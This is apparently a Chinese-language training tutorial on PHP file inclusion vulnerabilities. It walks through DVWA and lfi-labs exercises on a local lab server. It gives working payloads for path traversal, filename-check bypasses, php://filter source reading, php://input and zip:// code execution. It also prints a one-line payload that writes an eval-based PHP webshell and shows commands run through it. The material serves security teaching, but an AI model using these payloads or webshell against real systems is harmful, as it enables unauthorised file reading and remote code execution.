#  文件包含漏洞

## 01.文件包含

### 文件包含漏洞

文件包含漏洞（File Inclusion Vulnerability）是一种Web应用程序常见的安全漏洞，通常发生在PHP语言中，攻击者可以通过该漏洞加载和执行服务器上的任意文件，甚至执行恶意脚本，获取敏感信息或执行任意代码。

##### 文件包含漏洞通常分为两种类型：

1. 本地文件包含（LFI, Local File Inclusion）：

本地文件包含漏洞发生在攻击者利用Web应用中的输入参数，将服务器上的本地文件作为响应内容的一部分读取或执行。

攻击者可以通过这个漏洞读取服务器上的敏感文件（如/etc/passwd、配置文件等），甚至执行某些脚本文件，导致信息泄露或远程代码执行。

2. 远程文件包含（RFI, Remote File Inclusion）：

远程文件包含漏洞允许攻击者通过Web应用程序的输入参数，从外部服务器加载并执行远程的恶意脚本。

如果服务器的配置允许从外部资源加载文件，攻击者可以利用这个漏洞上传恶意代码到远程服务器并在目标Web服务器上执行。

### 文件包含定义

文件包含（File Inclusion）是Web开发中一种加载和执行文件的机制，通常用于将外部文件的内容包含到当前文件中。

文件包含的作用是使代码更模块化、可重用，避免重复编写相同的功能。

在许多编程语言（如PHP、Python等）中，文件包含是实现代码共享和组织代码结构的常用方法。

#### 在Web开发中，文件包含常见于以下情况：

- 模板文件：动态加载HTML页面的不同部分（如头部、导航栏、底部）。
- 配置文件：包含数据库连接配置或其他系统设置。
- 函数库或模块：加载实现某些特定功能的文件。

```bash
include'header.php';

require'config.php';
```

### 文件包含漏洞-成因

文件包含漏洞的成因主要是由于Web应用程序在实现文件包含功能时，对用户输入的文件路径缺乏充分的验证和过滤，导致攻击者可以控制文件的加载过程。以下是文件包含漏洞常见的成因：

#### 缺乏输入验证和过滤：

当Web应用程序允许用户输入文件路径或名称，并使用该输入来动态加载文件时，

如果没有对输入进行严格的验证和过滤，攻击者可能会通过修改输入加载任意文件。

![image-20241031165210505](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031165210505.png)

####  使用不安全的文件包含函数：

在编程语言中，像PHP的include()、require()、include_once()和require_once()等函数可以加载指定路径的文件。

开发人员如果直接使用这些函数加载用户输入的路径而不加以限制，就可能引入文件包含漏洞。

- `include()`：尝试加载并执行指定文件。如果文件不存在或加载失败，程序会继续执行，并发出警告（warning）。
- `require()`：与include()类似，但如果文件不存在或加载失败，会抛出致命错误（fatal error），程序终止执行。
- `include_once()`：与include()功能相同，但如果之前已经加载过相同的文件，则不会再次加载。这有助于避免重复加载相同的文件。
- `require_once()`：与require()功能相同，但如果之前已经加载过相同的文件，则不会再次加载。

![image-20241031165226304](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031165226304.png)

用户可以通过`?page=../../etc/passwd`尝试加载系统上的敏感文件。



#### 目录遍历（Path Traversal）：

目录遍历是指攻击者通过在输入中添加../等目录跳转字符来访问服务器的上级目录。例如，输入../../etc/passwd可能会导致加载敏感的系统文件。
        如果应用程序没有正确处理这些特殊字符，攻击者就可以利用它们访问本地文件系统中的任意文件。

#### 不安全的服务器配置：

在PHP等编程语言中，如果服务器配置允许从远程服务器加载文件（例如PHP的allow_url_include设置为On），

就可能被利用来执行远程文件包含（RFI）攻击。

远程文件包含漏洞可以让攻击者从外部服务器加载恶意代码并在目标服务器上执行，导致远程代码执行等高风险问题。

#### 缺乏文件路径限制：

开发者没有对可以包含的文件进行白名单控制，或者没有使用绝对路径限制加载的范围。

如果应用程序可以任意加载文件，就可能导致攻击者通过构造输入加载系统文件或其他敏感文件。

#### 总结

- 1.没有合理地进行校验
- 2.被绕过





## 02.文件包含示例

### 示例1-维基百科

请先对代码进行阅读

![image-20241031084741146](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031084741146.png)

- 对于英语：http://yourdomain.com/index.php?language=english
- 对于法语：http://yourdomain.com/index.php?language=french
- 恶意构造：http://yourdomain.com/index.php?language=“恶意构造的代码”

#### 示例说明

![image-20241031084858033](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031084858033.png)

### 示例2-DVWA

#### 在dvwa靶场演示：

根据我们的点击，显示正常的网页

http://127.0.0.1/dvwa/vulnerabilities/fi/?page=include.php

![image-20241031165254108](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031165254108.png)

#### 更改网站，查看phpinfo

http://127.0.0.1/dvwa/vulnerabilities/fi/?page=../../phpinfo.php

![image-20241031165341220](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031165341220.png)

## 03.伪协议简介

### 伪协议

伪协议，为什么危险？因为它们能够操作文件

![image-20241031085135475](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031085135475.png)

### PHP伪协议

PHP伪协议（PHP Wrapper）是指PHP中的一种特性，允许开发者通过指定一个特殊的协议前缀来访问不同类型的资源。

伪协议的主要目的是扩展PHP的文件系统能力，使其能够访问不同类型的数据源，除了常规的文件系统之外。

PHP支持多种伪协议，常见的包括

```bash
file://：用于访问本地文件系统中的文件。
$content = file_get_contents('file:///path/to/local/file.txt');

http:// 和 https://：用于通过HTTP或HTTPS协议访问远程资源。
$content = file_get_contents('http://example.com');

ftp://：用于通过FTP协议访问远程FTP服务器上的文件。
$content = file_get_contents('ftp://username:password@ftp.example.com/file.txt');

data://：用于直接使用数据字符串作为资源。
$data = file_get_contents('data:text/plain;base64,SGVsbG8gd29ybGQ=');
```

**filter伪协议**是一种特殊的伪协议，用于在读取或写入数据时应用过滤器。

它可以用于多种用途，如数据验证、清理或转换。

filter流可以通过 `php://filter` 来使用，主要用于对流内容应用内置的过滤器。

```bash
php://filter/[filter_name]/resource
```

其中 [filter_name] 是要应用的过滤器名称，resource 是要过滤的实际资源（如文件或字符串）。

### 内置过滤器

```php
string.strip_tags：去掉字符串中的HTML和PHP标签。
string.toupper：将字符串转换为大写。
string.tolower：将字符串转换为小写。
url：对URL进行编码。

$html = "<p>Hello <strong>World</strong>!</p>";
$filtered = file_get_contents('php://filter/string.strip_tags/resource=' . urlencode($html));
echo $filtered;  // 输出: Hello World!

$string = "hello world";
$filtered = file_get_contents('php://filter/string.toupper/resource=' . urlencode($string));
echo $filtered;  // 输出: HELLO WORLD
```

### input

在PHP中，`php://input` 是一个伪协议流，用于读取原始POST数据，**将post上来的数据当作php代码进行处理**。

这对于处理HTTP POST请求时传递的数据（特别是JSON或XML格式的内容）非常有用。

```php
// 设置请求头 Content-Type 为 application/json
// {"name": "John", "age": 30}

$jsonData = file_get_contents("php://input");
$data = json_decode($jsonData, true); // 将JSON数据转换为PHP数组
echo"Name: " . $data['name'] . "<br>"; 
echo"Age: " . $data['age'];
```

### 其他利用方式

- 00截断
- 长度截断（windows256，linux 4096）

- 包含文件日志

- 包含session


## 04.文件包含随堂练习

### LFI 本地文件包含

#### lfi-labs靶场

在网络安全领域中，实践是检验真理的唯一标准。

`lfi-labs`是一款专注于本地文件包含（LFI）、远程文件包含（RFI）和命令注入漏洞练习的工具包。

这个由jose nazario创建的项目，不仅提供了学习这些高级渗透测试技巧的机会，还为测试检测产品和开发攻防技能搭建了实验平台。

github：https://github.com/paralax/lfi-labs

```bash
git clone https://github.com/paralax/lfi-labs
```

#### LFI-1

![image-20241031101344055](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031101344055.png)

然后点开LFI-1，出现如下界面

![image-20241031101119820](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031101119820.png)

##### GET请求、POST请求

1. GET 请求（获取资源、查询数据等场景）

参数传递方式：GET 请求将参数附加在 URL 的查询字符串中。

```bash
http://example.com/page?name=John&age=30
```

数据长度限制：由于 URL 的长度有限，GET 请求的传递数据大小也受到限制，通常为几千字节。
安全性：因为参数在 URL 中明文显示，不适合传输敏感信息（如密码）。

2. POST 请求（适用于提交表单、上传文件或执行对服务器资源有影响的操作，如登录、注册和提交订单等。）

参数传递方式：POST 请求将数据放在请求体中，而不是 URL 中。客户端发送的请求示例：

```bash
POST /submit-form HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

name=John&age=30
```

- 数据长度限制：理论上没有限制，可以传输更大数据量。服务器配置和客户端实现可能会对其大小施加限制。
- 安全性：参数在请求体中传输，相比 GET 更适合传输敏感数据（但仍需配合 HTTPS 使用，才能保证数据加密传输）。

##### 源码

![image-20241031093037772](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031093037772.png)

```php
<?php     include("../common/header.php");   ?>

<!-- from https://pentesterlab.com/exercises/php_include_and_post_exploitation/course -->
<?php hint("will include the arg specified in the GET parameter \"page\""); ?>

<form action="/LFI-1/index.php" method="GET">
    <input type="text" name="page">
</form>

<?php
include($_GET["page"]);
?>

```

##### 实验步骤

通过get方法传递page参数，然后通过include执行，因此可以通过page传入恶意文件

1. 创建1.txt文件，里面写内容，然后保存

2. 复制文件路径，‪`C:\file\1.txt`

3. 在框里输入文件路径

> 注意：`C://文件夹/文件夹/文件名.txt`

```bash
http://192.168.70.10:8101/LFI-1/index.php?page=C://file/1.txt
```

![image-20241031092552372](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031092552372.png)

输出了文件内容

```bash
http://192.168.70.10:8101/LFI-1/index.php?page=C:\Windows\win.ini
```

![image-20241031091917428](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031091917428.png)

#### include

在PHP中，include 或 require 语句会将包含的文件当作PHP代码来执行。

无论文件的扩展名是什么，只要文件中的内容是有效的PHP代码，PHP都会解析并执行这些代码。

如果文件不包含有效的PHP代码（例如HTML、文本文件等），PHP会按照文件内容的原样输出。

即使文件扩展名不是.php，只要文件中有`<?php ... ?>`这样的PHP代码块，PHP会执行这些代码块。

##### 总的来讲

- 1、include会将文件内容当作PHP代码来解析。
- 2、文件的扩展名并不影响PHP的解析方式，只要文件内容符合PHP的语法规范，PHP就会执行其中的代码。

#### 00截断

在PHP中，“00截断”通常与文件包含（如include或require）相关，尤其是在处理动态文件包含时可能存在安全隐患。

00截断（Null Byte Truncation）是一种利用Web应用程序对上传文件处理不当的技巧，尤其是在处理文件名或文件内容时。

00截断依赖于某些编程语言或系统在遇到ASCII null字节（`\x00`）时的行为，即终止字符串解析或文件处理。

##### 原理

1. 文件名截断：上传文件时，在文件名中插入一个null字节，可能导致服务器在null字节处截断文件名，忽略null字节后的部分。

   这可以用来绕过基于文件名的过滤或检查。

2. 文件内容截断：在文件内容中插入`null`字节，可能导致文件内容在null字节处被截断，这可以用来隐藏或插入恶意内容。

3. 文件名：Web应用只允许上传.jpg文件，通过在文件名中使用`null`字节，攻击者可以上传一个文件，如`shell.php\x00.jpg`。

   上传时只看到.jpg扩展名，允许上传，解析时解析成shell.php。

4. 文件内容：Web应用在处理文件内容时遇到null字节就停止读取，攻击者可以在合法文件内容后插入`null`字节，然后跟上恶意代码。

#### LFI-2 00截断

##### 00截断

PHP `5.3.29`及其之前的版本存在`00`漏洞，phpstudy一般下载都会失败

访问：https://windows.php.net/downloads/releases/archives/

##### 源码

![image-20241031095812790](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031095812790.png)

```php
<?php
include("includes/".$_GET['library'].".php"); 
?>
```

> include/+文件名/+.php

`include/`理解为文件目录，回退使用`../`

后缀添加了`.php`,使用`%00`截断

##### 包含php文件

![image-20241031095728513](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031095728513.png)

```bash
http://192.168.70.10:8101/LFI-2/index.php?library=../1
```

![image-20241031095624634](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031095624634.png)



##### 包含非php文件

比如一个ini，那么就使用`../../boot.ini`，然后再用`%00`吧.php截断

```bash
inlcude/../boot.ini%00.php
#或者直接访问目录下的php文件，只是不加扩展名了
```

#### LFI-3 黑名单:文件名后缀

![image-20241031100404087](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031100404087.png)

```bash
<?php
if (substr($_GET['file'], -4, 4) != '.php')
 echo file_get_contents($_GET['file']);
else
 echo 'You are not allowed to see source files!'."\n";
?>
```

> 黑名单:截取文件名后缀4个字符是否是`.php`

要访问目录中结尾是php的文件时候，系统会**判断你传入的文件名结尾**，如果是php文件，那么就不会让你进行文件内容获取

![image-20241031101632349](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031101632349.png)

##### 点和斜线

**文件后缀名加点**    

把`php`变为 `php.`

> php.

PHP的`file_get_contents()`函数会根据传入的路径读取文件内容。

在文件系统中，实际文件的扩展名是`.php`，但由于传入的字符串包含额外的`.`，PHP仍然会解析并试图读取实际的`phpinfo.php`文件。

文件系统通常会将`phpinfo.php.`视为一个有效的文件名，但在字符串比较时，检查仍然基于传入的内容。

```bash
http://192.168.70.10:8101/LFI-3/index.php?file=../LFI-2/1.php.
```

![image-20241031101740072](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031101740072.png)



##### 大小写绕过

这里进行字符串比较就有漏洞，我们可以把php中任意一个或多个**换成大写**，这样进行判断的时候就能够绕过

比如我要查看`phpinfo.php`     就可以写成`phpinfo.Php`从而逃过检查

> .Php

```bash
http://192.168.70.10:8101/LFI-3/index.php?file=../LFI-2/1.Php
```

![image-20241031101827543](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031101827543.png)

##### 空格绕过

比如我要查看`phpinfo.php`     就可以写成`phpinfo.php空格 ` ,从而逃过检查，判断的时候就可以绕过后缀名检查了

> .php空格
>
> .php%20
>
> .php%a0
>
> .php+

```bash
http://192.168.70.10:8101/LFI-3/index.php?file=../LFI-2/1.php%20
http://192.168.70.10:8101/LFI-3/index.php?file=../LFI-2/1.php+
```

![image-20241031102023810](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031102023810.png)

![image-20241031101924137](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031101924137.png)

#### LFI-4

```bash
<?php
include('includes/class_'.addslashes($_GET['class']).'.php');
?>
```

绕过结尾增加的`.php`

`includes/class_`当成两个目录,使用`/`闭合当成`includes/class_/`

```bash
http://192.168.70.10:8101/LFI-4/index.php?class=/../../../1
```

![image-20241031103132345](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031103132345.png)

#### LFI-5

```php
<?php
   $file = str_replace('../', '', $_GET['file']);
   if(isset($file))
   {
       include("pages/$file");
   }
   else
   {
       include("index.php");
   }
?>
```

> - `../`  会被 替换成 **空**
> - `pages/`当成一个文件夹

##### 双写绕过

**../双写**

如果是  `..././`变成`../`

如果是`..././..././`，则会变为`../../`   可以一直向上级目录跳转

使用`..././..././phpinfo.php`是 `../../phpinfo.php`，即可访问到phpinfo.php

```bash
http://192.168.70.10:8101/LFI-5/index.php?file=..././..././1.php
```

![image-20241031104503198](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031104503198.png)

#### LFI-6

这里看到是post方法传参的，因此需要将page进行post，当你进行传参的时候，其实你是看不到使用什么参数过去的

```bash
http://192.168.70.10:8101/LFI-6/index.php

page=../1.php
```

![image-20241031104745559](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031104745559.png)

##### POST

这时候就需要开启`burp`，拦截消息，查看到我们测试输入的参数被page接收了

可以直接在这里进行修改，把123改为文件路径

或者使用`hackerbar` post

#### get shell

那么应该怎么通过文件包含去`getshell`呢

##### 上传图片码

首先，假设我们通过**文件上传手段**传入了**一张图像**`echo.jpg`，但是图像里面的内容是病毒代码

![image-20241031110615555](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031110615555.png)

```bash
<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["shell"])?>');?>
```

> 代码逻辑：创建打开shell.php，在里面写入`<?php eval($_POST[shell])?>`
>

##### 包含图片码

触发创建文件

```bash
http://192.168.70.10:8101/LFI-6/index.php

page=../echo.jpg
```

![image-20241031111710151](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031111710151.png)

然后包含执行`../echo.jpg`，shell.php就被创建出来了



##### 访问shell.php

eval可以把字符串当作命令执行，因此可以执行我们post上去的shell参数中的内容

首先要运行`shell.php`

打开对应shell网址，发现没有内容

```bash
http://192.168.70.10:8101/LFI-6/shell.php
```

![image-20241031112725441](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031112725441.png)

##### 执行木马

通过hacker bar进行post，shell中传入`echo "Hello World!"`;

```bash
http://192.168.70.10:8101/LFI-6/shell.php

shell=echo "Hello World!";
shell=system(whoami);
```

![image-20241031112906713](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031112906713.png)

![image-20241031113044991](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031113044991.png)

##### 蚁剑连接

```bash
http://192.168.70.10:8101/LFI-6/shell.php
shell
```

![image-20241031113158597](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031113158597.png)

![image-20241031113215723](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031113215723.png)

#### LFI-7

```bash
<?php
include("includes/".$_POST['library'].".php"); 
?>
```

![image-20241031133637280](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031133637280.png)

原理是一样的，只不过这里library用的是post方法传参数的

> ../../1

```bash
http://192.168.70.10:8101/LFI-7/index.php

library=../../1
```

![image-20241031133858735](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031133858735.png)

#### LFI-8 

```bash
<?php
if (substr($_POST['file'], -4, 4) != '.php')
 echo file_get_contents($_POST['file']);
else
 echo 'You are not allowed to see source files!'."\n";
?>
```

可以变成`.php.`绕过，只不过用了`post`传参数

> .php.
>
> .Php
>
> .php+

```bash
http://192.168.70.10:8101/LFI-8/index.php

file=../1.php.
```

![image-20241031135239694](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031135239694.png)

### filiter伪协议

#### 文件包函数：

- include();
- include_once();
- require();
- require_once();

#### 文件操作类函数：

- fopen();
- file();
- readfile();
- file_get_contents();......
- php://filter

`php://filter` 是一种元封装器，设计用于数据流打开时的筛选过滤应用

php属性设置中，无论`allow_url_fopen`，`allow_url_include`是否开启都可以使用

可以作为一个中间流来过滤其他的数据流。通常使用该协议来读取或者写入部分数据，且在读取和写入之前对数据进行一些过滤，

例如base64编码处理，rot13处理等

#### 伪协议用法

```bash
php://filter/read=convert.base64-encode/resource=c:/windows/win.ini
```

> read是要执行的操作
>
> convert.base64-encode的意思是读出的内容经过一次base64编码
>
> resource后面跟的是读取内容的路径

![image-20241031104101982](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031104101982.png)

```bash
php://filter/过滤器|过滤器/resource=要过滤的数据流
```



```bash
echo file_get_contents
("php://filter/read=convert.base64-encode|convert.base64-encode/resource=data://text/plain,<?php phpinfo();?>");
```

> `data://text/plain` 是一种 PHP 数据流，允许您在 PHP 脚本中直接嵌入数据
>
> 上述代码对 `<?php phpinfo();?>` 进行了**两次base64编码**处理。

#### php://filter协议的过滤器分为四类

1. 字符串过滤器
2. 转换过滤器
3. 压缩过滤器
4. 加密过滤器

##### filter字符串过滤器

每个过滤器都正如其名字暗示的那样工作并与内置的 PHP 字符串函数的行为相对应。

字符串过滤器以 string 开头，常见的过滤器有 rot13、toupper、tolower等

![image-20241031104213171](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031104213171.png)

##### filter转换过滤器

主要含有三类，分别是base64的编码转换、quoted-printable的编码转换以及iconv字符编码的转换。该类过滤器以convert（转换）开头。

- convert.base64-encode
- convert.base64-decode

将数据进行base64编码、解码

![image-20241031104253626](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031104253626.png)

#### LFI-1

包含函数并不直接看到代码而只是执行，但是通过`filter`方式可以将**代码显示**出来

##### php://filter显示index.php

例如LFI-1例子，使用了include，只能执行，看不到源码

> php://filter/convert.base64-encode/resource=index.php

```bash
http://192.168.70.10:8101/LFI-1/index.php?page=php://filter/convert.base64-encode/resource=index.php
```

![image-20241031135827653](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031135827653.png)

```bash
PD9waHAgICAgIGluY2x1ZGUoIi4uL2NvbW1vbi9oZWFkZXIucGhwIik7ICAgPz4NCg0KPCEtLSBmcm9tIGh0dHBzOi8vcGVudGVzdGVybGFiLmNvbS9leGVyY2lzZXMvcGhwX2luY2x1ZGVfYW5kX3Bvc3RfZXhwbG9pdGF0aW9uL2NvdXJzZSAtLT4NCjw/cGhwIGhpbnQoIndpbGwgaW5jbHVkZSB0aGUgYXJnIHNwZWNpZmllZCBpbiB0aGUgR0VUIHBhcmFtZXRlciBcInBhZ2VcIiIpOyA/Pg0KDQo8Zm9ybSBhY3Rpb249Ii9MRkktMS9pbmRleC5waHAiIG1ldGhvZD0iR0VUIj4NCiAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icGFnZSI+DQo8L2Zvcm0+DQoNCjw/cGhwDQppbmNsdWRlKCRfR0VUWyJwYWdlIl0pOw0KPz4NCg==
```

###### base64解码

![image-20241031135904295](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031135904295.png)

![image-20241031135935690](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031135935690.png)

```php
<?php     include("../common/header.php");   ?>

<!-- from https://pentesterlab.com/exercises/php_include_and_post_exploitation/course -->
<?php hint("will include the arg specified in the GET parameter \"page\""); ?>

<form action="/LFI-1/index.php" method="GET">
    <input type="text" name="page">
</form>

<?php
include($_GET["page"]);
?>

```



##### php://filter显示win.ini

```bash
http://192.168.70.10:8101/LFI-1/index.php?page=php://filter/read=convert.base64-encode/resource=c:/windows/win.ini
```

这样就以`base64`编码方式输出了代码

![image-20241031135541255](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031135541255.png)

###### base64解码

![image-20241031135652041](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031135652041.png)

### input

#### EX-1

> php版本：7.3.4

```bash
<meta charset="utf8">
<?php
error_reporting(0);
$file = $_GET["file"];
if(stristr($file,"php://filter") || stristr($file,"zip://") || stristr($file,"phar://") || stristr($file,"data:")){
	exit('hacker!');
}
if($file){
	if ($file!="http://www.baidu.com") echo "tips：flag在当前目录的某个文件中";
	include($file);
}else{
	echo '<a href="?file=http://www.baidu.com">click go baidu</a>';
}
?>
```

`php://input`会将post请求的数据当作php代码执行

![image-20241031140812924](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031140812924.png)

```bash
http://192.168.70.10:8101/EX-1/?file=http://www.baidu.com
```

![image-20241031163049093](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031163049093.png)

打开EX-1，发现里面有个链接，点击后能跳转到百度

![image-20241031161457174](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031161457174.png)

使用`php://filter`试一下，结果显示我是黑客，也就是在php代码中已经对`filter`进行了防范

```bash
php://filter/convert.base64-encode/resource=index.php
```

![image-20241031161605419](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031161605419.png)

##### phpinfo

使用`php://input`将请求都变为`php`执行代码

![image-20241031162638058](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031162638058.png)

就可以看见`phpinfo`信息了

```bash
GET /EX-1/?file=php://input HTTP/1.1
Host: 192.168.70.10:8101
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.70.10:8101/EX-1/?file=
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive
Content-Length: 23

<?php echo phpinfo();?>
```



##### 写入木马

![image-20241031162812147](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031162812147.png)

```bash
GET /EX-1/?file=php://input HTTP/1.1
Host: 192.168.70.10:8101
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.70.10:8101/EX-1/?file=
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive
Content-Length: 71

<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["shell"])?>');?>
```

这里就写入成功了

![image-20241031162848855](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031162848855.png)

### ZIP伪协议

`zip://` 可以访问压缩包里面的文件。当它与包含函数结合时，`zip://`流会被当作php文件执行。

从而实现任意代码执行。

```bash
zip://[压缩文件绝对路径]#[压缩文件内的子文件名]
zip://xxx.png#shell.php
```

在windows下测试要`5.3.0<PHP<5.4`才可以 `#`在浏览器中要编码为`%23`，否则浏览器默认不会传输特殊字符

> #### 注意：
>
> 1. ①`zip://`中只能传入**绝对路径**。
> 2. ②要用`#`分隔**压缩包**和**压缩包里的内容**，并且`#`要用url编码`%23`（即下述POC中#要用%23替换）
> 3. ③只需要是`zip`的压缩包即可，**后缀名可以任意更改**
>
> ```bash
> zip://C:/Users/32995/Desktop/FileInclude/press.zip%23press.php
> ```

#### EX-2

> php：5.3.29

```bash
//index.php
<meta charset="utf8">
<?php
error_reporting(0);
$file = $_GET["file"];
if (!$file) echo '<a href="?file=upload">upload?</a>';
if(stristr($file,"input")||stristr($file, "filter")||stristr($file,"data")/*||stristr($file,"phar")*/){
	echo "hick?";
	exit();
}else{
	print_r($file);
	include($file);
}
?>
```

> 禁用php://input，php://filter，php://data，php://phar字符串
>
> 没禁用php://zip

![image-20241031163627689](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031163627689.png)

![image-20241031163655854](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031163655854.png)

##### 1.php

```bash
<?php phpinfo();?>
```

![image-20241031164428248](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031164428248.png)

##### 1.zip

![image-20241031164520919](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031164520919.png)

##### zip://

> zip://C:\tools\phpstudy_pro\WWW\lfi-labs\EX-2\1.zip#1.php
>
> zip://C:\tools\phpstudy_pro\WWW\lfi-labs\EX-2\1.zip%231.php

```bash
http://192.168.70.10:8101/EX-2/?file=zip://C:\tools\phpstudy_pro\WWW\lfi-labs\EX-2\1.zip%231.php
```

![image-20241031164824575](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031164824575.png)

